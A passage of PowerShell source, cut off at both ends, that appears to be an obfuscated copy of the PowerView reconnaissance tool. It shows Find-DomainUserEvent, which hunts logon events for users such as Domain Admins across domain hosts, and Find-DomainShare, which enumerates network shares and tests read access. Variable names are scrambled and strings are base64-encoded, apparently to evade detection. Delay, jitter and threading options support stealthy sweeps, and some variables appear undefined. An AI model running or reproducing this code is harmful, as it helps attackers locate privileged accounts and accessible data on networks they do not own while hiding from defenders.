            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
}
function Find-DomainUserEvent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${___/\______/=\_/=\} = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${_/=\__/=\/\/\/=\/\} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${____/\_____/\/===} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) {
            ${/===\/=\__/\___/=} = ____/\/====\/\___/ @____/\_____/\/=== | select -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5AA==')))] -or (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIA')))])) {
            ${/===\_/\_/===\_/=} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5ADoAIAAkAFUAcwBlAHIARwByAG8AdQBwAEkAZABlAG4AdABpAHQAeQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/===\/=\__/\___/=} = __/\_____/===\/\/\ @/===\_/\_/===\_/= | select -ExpandProperty MemberName
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = ${/=\/\/\/=\__/\_/=}
        }
        else {
            ${_/\_/\______/=\__} = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/\______/=\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMAIABpAG4AIABkAG8AbQBhAGkAbgA6ACAAJABEAG8AbQBhAGkAbgA=')))
            ${_/\/\/\/=\_/=\__/} = _/=\/==\_/\_/\/\/= @_/\_/\______/=\__ | select -ExpandProperty dnshostname
        }
        if (${_/\/\/\/=\_/=\__/} -and (${_/\/\/\/=\_/=\__/} -isnot [System.Array])) {
            ${_/\/\/\/=\_/=\__/} = @(,${_/\/\/\/=\_/=\__/})
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBzACAAJAB7AF8ALwBcAC8AXAAvAFwALwA9AFwAXwAvAD0AXABfAF8ALwB9AA==')))
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, ${___/\______/=\_/=\}, ${_/=\__/=\/\/\/=\/\}, $MaxEvents, ${/===\/=\__/\___/=}, $Filter, $Credential)
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                if (${_/\/==\___/\/=\__}) {
                    ${/=\____/=\____/\/} = @{
                        'ComputerName' = ${__/\_/==\/\/=\/\_}
                    }
                    if (${___/\______/=\_/=\}) { ${/=\____/=\____/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFQAaQBtAGUA')))] = ${___/\______/=\_/=\} }
                    if (${_/=\__/=\/\/\/=\/\}) { ${/=\____/=\____/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAVABpAG0AZQA=')))] = ${_/=\__/=\/\/\/=\/\} }
                    if ($MaxEvents) { ${/=\____/=\____/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgARQB2AGUAbgB0AHMA')))] = $MaxEvents }
                    if ($Credential) { ${/=\____/=\____/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    if ($Filter -or ${/===\/=\__/\___/=}) {
                        if (${/===\/=\__/\___/=}) {
                            ________/====\/\/\ @/=\____/=\____/\/ | ? {${/===\/=\__/\___/=} -contains $_.TargetUserName}
                        }
                        else {
                            ${/===\__/====\_/\_} = 'or'
                            $Filter.Keys | % {
                                if (($_ -eq 'Op') -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA'))))) {
                                        ${/===\__/====\_/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA')))
                                    }
                                }
                            }
                            ${/=\__/=\_/\___/\/} = $Filter.Keys | ? {($_ -ne 'Op') -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))}
                            ________/====\/\/\ @/=\____/=\____/\/ | % {
                                if (${/===\__/====\_/\_} -eq 'or') {
                                    ForEach (${_/===\____/\_/\_/} in ${/=\__/=\_/\___/\/}) {
                                        if ($_."${_/===\____/\_/\_/}" -match $Filter[${_/===\____/\_/\_/}]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach (${_/===\____/\_/\_/} in ${/=\__/=\_/\___/\/}) {
                                        if ($_."${_/===\____/\_/\_/}" -notmatch $Filter[${_/===\____/\_/\_/}]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        ________/====\/\/\ @/=\____/=\____/\/
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserEvent] Enumerating server ${__/\_/==\/\/=\/\_} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.count))"
                ${___/=\/\________/} = icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, ${___/\______/=\_/=\}, ${_/=\__/=\/\/\/=\/\}, $MaxEvents, ${/===\/=\__/\___/=}, $Filter, $Credential
                ${___/=\/\________/}
                if (${___/=\/\________/} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            ${/===\/=\/\/\_/=\_} = @{
                'StartTime' = ${___/\______/=\_/=\}
                'EndTime' = ${_/=\__/=\/\/\/=\/\}
                'MaxEvents' = $MaxEvents
                'TargetUsers' = ${/===\/=\__/\___/=}
                'Filter' = $Filter
                'Credential' = $Credential
            }
            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
}
function Find-DomainShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/====\/\/=\_/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${__/==\/=\__/==\/==} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${__/===\/==\_/=\/\_} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${__/==========\_/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = ${/=\/\/\/=\__/\_/=}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${_/\/\/\/=\_/=\__/} = __/\/\/=\/\_/==\/\ @_/\/====\/\/=\_/= | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, $CheckShareAccess, ${__/\__/\/\/\_/\/==})
            if (${__/\__/\/\/\_/\/==}) {
                $Null = __/\__/\/==\/==\_/ -__/\__/\/\/\_/\/== ${__/\__/\/\/\_/\/==} -__/\/=\/==\/=\/=\_
            }
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                if (${_/\/==\___/\/=\__}) {
                    ${/=\/=\/=\_/=====\} = ___/=\_/\_/=\/==== -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_}
                    ForEach (${_/\_/==\/\_/===\/} in ${/=\/=\/=\_/=====\}) {
                        ${_/=\/\/\/\___/\/\} = ${_/\_/==\/\_/===\/}.Name
                        $Path = '\\'+${__/\_/==\/\/=\/\_}+'\'+${_/=\/\/\/\___/\/\}
                        if ((${_/=\/\/\/\___/\/\}) -and (${_/=\/\/\/\___/\/\}.trim() -ne '')) {
                            if ($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ${_/\_/==\/\_/===\/}
                                }
                                catch {
